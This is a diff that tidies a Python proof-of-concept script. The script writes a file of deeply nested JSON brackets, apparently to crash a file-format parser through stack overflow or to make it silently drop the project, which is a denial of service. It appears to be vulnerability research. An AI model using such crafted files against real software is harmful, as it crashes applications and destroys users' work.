@@ -9,12 +9,11 @@ Note: The fix added kMaxJsonDepth=1024 which limits recursion,
 but 1024 stack frames is still enough to exhaust small-stack environments
 (CI runners, containers with 2MB stack).
 """
-import json, sys, os
+import os, sys
 
 def build_deep_json(depth):
     """Generate deeply nested JSON that tests the parser's recursion limit."""
-    s = "[" * depth + "]" * depth
-    return s
+    return "[" * depth + "]" * depth
 
 def main():
     output = sys.argv[1] if len(sys.argv) > 1 else 'poc_json_stack.aes'
@@ -26,9 +25,9 @@ def main():
     
     size = os.path.getsize(output)
     print(f"[+] PoC: {output} ({size} bytes, depth={depth})")
-    print(f"[+] kMaxJsonDepth=1024 → parser returns empty JSON at depth 1025")
-    print(f"[+] Without the fix: 50k frames → stack overflow → SIGSEGV")
-    print(f"[+] With fix: silently truncated — functional DoS (empty project)")
+    print("[+] kMaxJsonDepth=1024 → parser returns empty JSON at depth 1025")
+    print("[+] Without the fix: 50k frames → stack overflow → SIGSEGV")
+    print("[+] With fix: silently truncated — functional DoS (empty project)")
 
 if __name__ == '__main__':
     main()
